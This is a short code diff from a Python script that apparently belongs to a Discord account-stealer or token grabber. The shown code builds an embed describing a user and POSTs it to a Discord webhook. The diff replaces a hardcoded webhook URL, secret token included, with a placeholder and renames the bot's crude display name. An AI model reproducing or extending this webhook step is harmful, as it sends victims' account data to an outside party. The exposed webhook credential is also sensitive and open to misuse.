@@ -207,11 +207,11 @@ def main():
                             }
                         }
                     ],
-                    "username": "SLUT HIRAKO",
+                    "username": "SLUT SISU",
                     "avatar_url": "https://avatars.githubusercontent.com/u/158478884?s=400&u=5dac083b5fdb13135930b3d7196c3b044eaec79c&v=4"
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1387438745615204403/Qsd4r_XpkjhTPievoYEJs9GT2XBu2r6N6V2OtzsXBTUPfRp33WsUDd8oR7pgL6lNSbkO', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('WEBHOOK_URL', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
